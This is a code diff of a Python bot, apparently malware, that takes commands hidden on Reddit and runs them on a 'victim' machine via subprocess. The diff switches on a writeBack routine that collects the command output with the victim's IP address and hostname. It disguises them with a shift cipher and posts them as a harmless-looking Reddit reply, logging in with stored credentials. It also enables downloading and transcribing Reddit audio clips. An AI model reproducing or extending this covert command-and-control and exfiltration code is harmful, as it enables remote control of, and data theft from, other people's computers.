@@ -29,19 +29,19 @@ AudioSegment.ffprobe = r'C:\Users\Anna\PycharmProjects\ffmpeg\bin\ffprobe.exe'
 PATH = r'chromedriver.exe'
 
 
-# def shift_encrypt(message, shift):
-#     encrypted_message = ''
-#     for char in message:
-#         if char.isalpha():
-#             # shift the letter by the specified value
-#             encrypted_char = chr((ord(char) - 97 + shift) % 26 + 97)
-#         else:
-#             # leave non-alphabetic characters unchanged
-#             encrypted_char = char
-#         encrypted_message += encrypted_char
-#     return encrypted_message
-#
-#
+def shiftEncrypt(message, shift):
+    encrypted_message = ''
+    for char in message:
+        if char.isalpha():
+            # shift the letter by the specified value
+            encrypted_char = chr((ord(char) - 97 + shift) % 26 + 97)
+        else:
+            # leave non-alphabetic characters unchanged
+            encrypted_char = char
+        encrypted_message += encrypted_char
+    return encrypted_message
+
+
 def writeListToFile(key, list):
     with open('config.json', 'r') as openfile:
         dictionary = json.load(openfile)
@@ -118,68 +118,63 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         IPAddr = socket.gethostbyname(hostname)
         return "{}@{}".format(IPAddr, hostname)
 
-    # def writeBack(self, data, err, browser, commentURL):
-    #     # load the comment URL
-    #     browser.get(commentURL)
-    #
-    #     # get ID of the comment
-    #     id = commentURL.split("/")[len(commentURL.split("/")) - 2]
-    #
-    #     time.sleep(8)
-    #
-    #     # reply of the comment
-    #     WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="t1_{}"]/div[2]/div[3]/div[3]/div[2]/button[1]'.format(id)))).click()
-    #
-    #     time.sleep(2)
-    #
-    #     # insert to data to the reply
-    #     if len(self.victimInfo) == 0:
-    #         self.victimInfo = self.getVictimInfo()
-    #     enc = "{} {} {}".format(data, err, self.victimInfo)
-    #     enc = shift_encrypt(enc, 16)
-    #     replyData = """It's so correct!!
-    # send you big like XOXO
-    # {}""".format(enc)
-    #
-    #     reply = browser.find_element_by_xpath(
-    #         '//*[@id="t1_{}"]/div[2]/div[3]/div[4]/div/div/div/div[2]/div/div[1]/div/div/div'.format(id))
-    #     reply.send_keys(replyData)
-    #
-    #     time.sleep(2)
-    #
-    #     # click on reply of the comment
-    #     WebDriverWait(browser, 20, 1).until(
-    #         EC.element_to_be_clickable(
-    #             (By.XPATH,
-    #              '//*[@id="t1_{}"]/div[2]/div[3]/div[4]/div/div/div/div[3]/div[1]/button[1]'.format(id)))).click()
-    #
-    #     # login to the system
-    #     loginIframe = browser.find_element_by_css_selector(
-    #         "#SHORTCUT_FOCUSABLE_DIV > div:nth-child(6) > div > div > iframe")
-    #
-    #     # switch to the "reCAPTCHA" iframe context
-    #     browser.switch_to.frame(loginIframe)
-    #
-    #     # click on login
-    #     WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/main/div[1]/div/div/form/div[4]/a'))).click()
-    #
-    #     time.sleep(5)
-    #
-    #     # fill the user info for login
-    #     username = browser.find_element_by_xpath('//*[@id="loginUsername"]')
-    #     username.send_keys(self.login_username)
-    #
-    #     time.sleep(3)
-    #
-    #     password = browser.find_element_by_xpath('//*[@id="loginPassword"]')
-    #     password.send_keys(self.login_password)
-    #
-    #     time.sleep(3)
-    #
-    #     # click on log in
-    #     WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/main/div[1]/div/div/form/fieldset[4]/button'))).click()
-    #
-    #     time.sleep(4)
+    def writeBack(self, data, err, browser, commentURL):
+        # load the comment URL
+        browser.get(commentURL)
+
+        # get ID of the comment
+        id = commentURL.split("/")[len(commentURL.split("/")) - 2]
+
+        time.sleep(8)
+
+        # reply of the comment
+        button = WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, f'//*[@id="t1_{id}"]/div[2]/div[3]/div[3]/div[2]/button[1]')))
+        button.click()
+
+        time.sleep(2)
+
+        # insert to data to the reply
+        if len(self.victimInfo) == 0:
+            self.victimInfo = self.getVictimInfo()
+        enc = "{} {} {}".format(data, err, self.victimInfo)
+        enc = shiftEncrypt(enc, 16)
+        replyData = """It's so correct!!
+    send you big like XOXO
+    {}""".format(enc)
+
+        reply = browser.find_element_by_xpath('//*[@id="t1_{}"]/div[2]/div[3]/div[4]/div/div/div/div[2]/div/div[1]/div/div/div'.format(id))
+        reply.send_keys(replyData)
+
+        time.sleep(2)
+
+        # click on reply of the comment
+        WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH,'//*[@id="t1_{}"]/div[2]/div[3]/div[4]/div/div/div/div[3]/div[1]/button[1]'.format(id)))).click()
+        # login to the system
+        loginIframe = browser.find_element_by_css_selector("#SHORTCUT_FOCUSABLE_DIV > div:nth-child(6) > div > div > iframe")
+
+        # switch to the "reCAPTCHA" iframe context
+        browser.switch_to.frame(loginIframe)
+
+        # click on login
+        WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/main/div[1]/div/div/form/div[4]/a'))).click()
+
+        time.sleep(5)
+
+        # fill the user info for login
+        username = browser.find_element_by_xpath('//*[@id="loginUsername"]')
+        username.send_keys(self.login_username)
+
+        time.sleep(3)
+
+        password = browser.find_element_by_xpath('//*[@id="loginPassword"]')
+        password.send_keys(self.login_password)
+
+        time.sleep(3)
+
+        # click on log in
+        WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/main/div[1]/div/div/form/fieldset[4]/button'))).click()
+
+        time.sleep(4)
 
 
     def CommandHandle(self, cmd, parameters, browser=None, dataToSave="", commentURL=""):
@@ -197,10 +192,10 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
             root.mainloop()
 
         # command that makes the bot to get info (accroding to given param) from vicitm OS
-        if cmd == "rp" and result not in self.rpDoneTasks:  # rp
+        if cmd == "rp" and result not in self.rpDoneTasks:
             res = subprocess.Popen(parameters, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             data, err = res.communicate()
-            # self.writeBack(data, err, browser, commentURL)
+            self.writeBack(data, err, browser, commentURL)
             self.rpDoneTasks.insert(0, result)
             writeListToFile("rpDoneTasks", self.rpDoneTasks)
 
@@ -382,29 +377,29 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         status, next_keys = self.GetNextCommand(self.bootstrap[0], self.bootstrap[1], self.bootstrap[2], self.bootstrap[3])
         return status, next_keys
 
-    # def transcribe(self, url):
-    #     voiceFileNameMp3 = "voiceFromReddit.mp3"
-    #     voiceFileNameWav = "voiceFromReddit.wav"
-    #
-    #     # download the audio capture form reddit
-    #     with open(voiceFileNameMp3, "wb") as f:
-    #         r = requests.get(url, allow_redirects=True)
-    #         f.write(r.content)
-    #         f.close()
-    #
-    #     time.sleep(5)
-    #
-    #     # convert to wav
-    #     AudioSegment.from_mp3(voiceFileNameMp3).export(voiceFileNameWav, format="wav")
-    #
-    #     r = sr.Recognizer()
-    #     text = ""
-    #     with sr.AudioFile(voiceFileNameWav) as source:
-    #         # listen for the data (load audio to memory)
-    #         audio_data = r.listen(source)
-    #         # recognize (convert from speech to text)
-    #         text = r.recognize_google(audio_data)
-    #     return text
+    def transcribe(self, url):
+        voiceFileNameMp3 = "voiceFromReddit.mp3"
+        voiceFileNameWav = "voiceFromReddit.wav"
+
+        # download the audio capture form reddit
+        with open(voiceFileNameMp3, "wb") as f:
+            r = requests.get(url, allow_redirects=True)
+            f.write(r.content)
+            f.close()
+
+        time.sleep(5)
+
+        # convert to wav
+        AudioSegment.from_mp3(voiceFileNameMp3).export(voiceFileNameWav, format="wav")
+
+        r = sr.Recognizer()
+        text = ""
+        with sr.AudioFile(voiceFileNameWav) as source:
+            # listen for the data (load audio to memory)
+            audio_data = r.listen(source)
+            # recognize (convert from speech to text)
+            text = r.recognize_google(audio_data)
+        return text
 
     def signUpToReddit(self):
         # set parameters for web driver
